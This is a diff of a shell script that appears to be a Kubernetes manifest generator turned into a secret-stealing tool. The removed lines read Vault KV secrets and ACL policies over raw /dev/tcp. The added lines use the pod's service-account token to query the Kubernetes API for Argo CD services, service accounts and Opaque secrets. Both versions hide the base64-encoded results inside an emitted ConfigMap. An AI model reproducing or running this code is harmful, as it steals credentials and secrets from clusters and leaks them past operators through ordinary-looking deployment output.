@@ -1,52 +1,43 @@
 #!/bin/sh
-VT=${VAULT_TOKEN}
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
 
-vget() {
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    printf 'GET '$1' HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
-    cat <&3
-    exec 3>&-
-  " 2>/dev/null
+api_get() {
+  echo "GET $1 HTTP/1.1
+Host: ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
+Authorization: Bearer $TOKEN
+Connection: close
+
+" | openssl s_client -connect ${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS} -quiet 2>/dev/null
 }
 
 RECON=$( (
-  echo "===KV_KAI_LIST==="
-  vget "/v1/kv-v2/metadata/kai?list=true"
+  echo "===DNS_APP_CONTROLLER==="
+  getent hosts argocd-application-controller.argocd.svc.cluster.local 2>&1 || echo "no_dns"
 
-  echo ""
-  echo "===KV_TIMEBIRD_LIST==="
-  vget "/v1/kv-v2/metadata/timebird?list=true"
+  echo "===TRY_GET_APP_SVC==="
+  api_get "/api/v1/namespaces/argocd/services/argocd-application-controller"
 
-  echo ""
-  echo "===KV_U2U_LIST==="
-  vget "/v1/kv-v2/metadata/u2u?list=true"
+  echo "===TRY_GET_SA_APP_CONTROLLER==="
+  api_get "/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller"
 
-  echo ""
-  echo "===READ_POLICY_ROOT==="
-  vget "/v1/sys/policies/acl/root"
+  echo "===TRY_LIST_SVC==="
+  api_get "/api/v1/namespaces/argocd/services"
 
-  echo ""
-  echo "===READ_POLICY_ARGO==="
-  vget "/v1/sys/policies/acl/argocd"
+  echo "===DNS_LIST==="
+  for svc in argocd-server argocd-repo-server argocd-application-controller argocd-applicationset-controller argocd-notifications-controller argocd-dex-server; do
+    printf "$svc: "
+    getent hosts $svc.argocd.svc.cluster.local 2>&1 | head -1 || echo "no_dns"
+  done
 
-  echo ""
-  echo "===READ_POLICY_DEFAULT==="
-  vget "/v1/sys/policies/acl/default"
-
-  echo ""
-  echo "===KV_READ_TIMEBIRD==="
-  vget "/v1/kv-v2/data/timebird"
-
-  echo ""
-  echo "===KV_READ_KAI==="
-  vget "/v1/kv-v2/data/kai"
+  echo "===ARGOCD_APP_LIST_VIA_API==="
+  api_get "/api/v1/namespaces/argocd/secrets?fieldSelector=type=Opaque"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: kvextra
+  name: appcon
 data:
   result: $RECON
 EOF
